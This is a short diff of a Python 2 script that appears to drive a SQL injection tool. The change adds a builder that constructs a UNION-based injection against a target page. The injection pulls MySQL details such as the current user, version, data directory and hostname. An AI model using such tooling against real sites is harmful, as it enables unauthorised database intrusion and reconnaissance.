@@ -11,7 +11,7 @@
 
 """
 import os, sys, urllib2
-import pf_injection, pf_parser
+import pf_builder, pf_injection, pf_parser
 import json
 
 if __name__ == '__main__':
@@ -23,8 +23,8 @@ if __name__ == '__main__':
     mysql_params = ['database()', 'user()', '@@version', '@@datadir', '@@hostname']
     # 'from information_schema.columns'
 
-    inj = pf_injection.injector("")
-    #data = inj.injection(page, mysql_params)
-    #pf_parser.parse(data) 
-    print inj.injection(page, mysql_params)
+    inj = pf_injection.Injector("")
+    b = pf_builder.Builder(page, mysql_params)
+    print b.build_union_injection(4,2)
+    #print results['database()']
 
